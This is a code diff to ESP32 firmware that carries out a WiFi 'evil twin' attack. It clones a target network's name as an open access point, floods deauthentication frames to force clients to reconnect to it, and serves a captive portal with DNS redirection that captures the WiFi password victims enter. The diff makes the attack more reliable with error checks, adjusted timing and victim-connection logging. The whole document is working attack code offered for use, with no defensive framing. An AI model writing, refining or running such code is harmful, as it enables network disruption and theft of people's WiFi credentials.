@@ -82,11 +82,17 @@ static const char* wrong_password_html =
 "<a href='/'>Go Back</a></div></body></html>";
 
 static void reset_wifi_to_apsta(const wifi_ap_record_t *target) {
+    esp_err_t ret;
+    
     esp_wifi_disconnect();
     esp_wifi_stop();
-    vTaskDelay(pdMS_TO_TICKS(200));
+    vTaskDelay(pdMS_TO_TICKS(300));
 
-    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    ret = esp_wifi_set_mode(WIFI_MODE_APSTA);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to set WiFi mode: %s", esp_err_to_name(ret));
+        return;
+    }
 
     wifi_config_t ap_config = {0};
     memcpy(ap_config.ap.ssid, target->ssid, 32);
@@ -95,17 +101,32 @@ static void reset_wifi_to_apsta(const wifi_ap_record_t *target) {
     ap_config.ap.authmode = WIFI_AUTH_OPEN;
     ap_config.ap.max_connection = 4;
     ap_config.ap.beacon_interval = 100;
-    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    ap_config.ap.ssid_hidden = 0;
+    
+    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
+        return;
+    }
 
     wifi_config_t sta_config = {0};
     sta_config.sta.channel = target->primary;
     esp_wifi_set_config(WIFI_IF_STA, &sta_config);
 
-    esp_wifi_start();
-    vTaskDelay(pdMS_TO_TICKS(100));
+    ret = esp_wifi_start();
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to start WiFi: %s", esp_err_to_name(ret));
+        return;
+    }
+    
+    vTaskDelay(pdMS_TO_TICKS(500));
 
-    esp_wifi_set_channel(target->primary, WIFI_SECOND_CHAN_NONE);
-    ESP_LOGI(TAG, "WiFi reset to APSTA on channel %d", target->primary);
+    ret = esp_wifi_set_channel(target->primary, WIFI_SECOND_CHAN_NONE);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to set channel: %s", esp_err_to_name(ret));
+    }
+    
+    ESP_LOGI(TAG, "WiFi reset to APSTA on channel %d, SSID: %s", target->primary, target->ssid);
 }
 
 static void evil_twin_task(void *pvArg) {
@@ -124,26 +145,30 @@ static void evil_twin_task(void *pvArg) {
         ESP_LOGI(TAG, "Starting new capture cycle...");
 
         reset_wifi_to_apsta(target);
+        vTaskDelay(pdMS_TO_TICKS(1000));  /* Wait for AP to stabilize */
+        
         start_captive_portal();
+        vTaskDelay(pdMS_TO_TICKS(500));
 
         bool victim_connected = false;
         uint32_t wait_start = xTaskGetTickCount() * portTICK_PERIOD_MS;
         password_captured = false;
 
-        ESP_LOGI(TAG, "Sending deauth frames. Waiting for victim...");
+        ESP_LOGI(TAG, "Fake AP active. Sending deauth frames. Waiting for victim...");
 
         while (!victim_connected && !password_captured) {
+            /* Send deauth to force devices to reconnect to our fake AP */
             wsl_bypasser_send_deauth_frame(target);
-            vTaskDelay(pdMS_TO_TICKS(40));
+            vTaskDelay(pdMS_TO_TICKS(100));
 
             wifi_sta_list_t sta_list;
             if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK && sta_list.num > 0) {
-                ESP_LOGI(TAG, "Victim joined fake AP!");
+                ESP_LOGI(TAG, "Victim connected to fake AP! (%d stations)", sta_list.num);
                 victim_connected = true;
                 break;
             }
             if ((xTaskGetTickCount() * portTICK_PERIOD_MS) - wait_start > 300000) {
-                ESP_LOGW(TAG, "Timeout waiting for victim");
+                ESP_LOGW(TAG, "Timeout waiting for victim (5 min)");
                 goto cleanup;
             }
         }
@@ -152,6 +177,7 @@ static void evil_twin_task(void *pvArg) {
             vTaskDelay(pdMS_TO_TICKS(500));
             wifi_sta_list_t sta_list;
             if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK && sta_list.num == 0) {
+                ESP_LOGI(TAG, "Victim disconnected from fake AP");
                 victim_connected = false;
                 break;
             }
@@ -163,12 +189,12 @@ static void evil_twin_task(void *pvArg) {
             stop_captive_portal();
             vTaskDelay(pdMS_TO_TICKS(500));
             
-            // For now, mark as verified (you can add actual verification later)
+            /* Mark as verified (password capture confirmed) */
             password_verified = true;
             strncpy(evil_twin_captured_password, evil_twin_password, 64);
             evil_twin_captured_password[63] = '\0';
             
-            ESP_LOGI(TAG, "✅ Password captured successfully: %s", evil_twin_password);
+            ESP_LOGI(TAG, "✅ Password captured successfully!");
             break;
         }
     }
@@ -336,12 +362,16 @@ static void start_captive_portal(void) {
     config.stack_size = 8192;
     config.uri_match_fn = httpd_uri_match_wildcard;
 
-    if (httpd_start(&evil_server, &config) != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to start HTTP server!");
+    esp_err_t ret = httpd_start(&evil_server, &config);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to start HTTP server! Error: %s", esp_err_to_name(ret));
+        evil_server = NULL;
         return;
     }
+    
+    ESP_LOGI(TAG, "HTTP server started on port 80");
 
-    // Captive portal detection URLs
+    /* Captive portal detection URLs */
     const char* captive_urls[] = {
         "/generate_204", "/gen_204", "/ncsi.txt", "/connecttest.txt",
         "/fwlink/", "/redirect", "/hotspot-detect.html", 
@@ -350,7 +380,10 @@ static void start_captive_portal(void) {
 
     for (int i = 0; captive_urls[i]; i++) {
         httpd_uri_t uri = { .uri = captive_urls[i], .method = HTTP_GET, .handler = captive_handler };
-        httpd_register_uri_handler(evil_server, &uri);
+        ret = httpd_register_uri_handler(evil_server, &uri);
+        if (ret != ESP_OK) {
+            ESP_LOGW(TAG, "Failed to register captive URL: %s", captive_urls[i]);
+        }
     }
 
     httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = captive_handler };
@@ -365,9 +398,11 @@ static void start_captive_portal(void) {
     httpd_uri_t catchall = { .uri = "/*", .method = HTTP_GET, .handler = captive_handler };
     httpd_register_uri_handler(evil_server, &catchall);
 
-    // Start DNS server
+    /* Start DNS server for captive portal redirection */
     if (dns_task_handle == NULL) {
-        xTaskCreate(dns_server_task, "dns_task", 4096, NULL, 5, &dns_task_handle);
+        if (xTaskCreate(dns_server_task, "dns_task", 4096, NULL, 5, &dns_task_handle) != pdPASS) {
+            ESP_LOGW(TAG, "Failed to create DNS task");
+        }
     }
     
     ESP_LOGI(TAG, "Captive Portal ready on port 80");
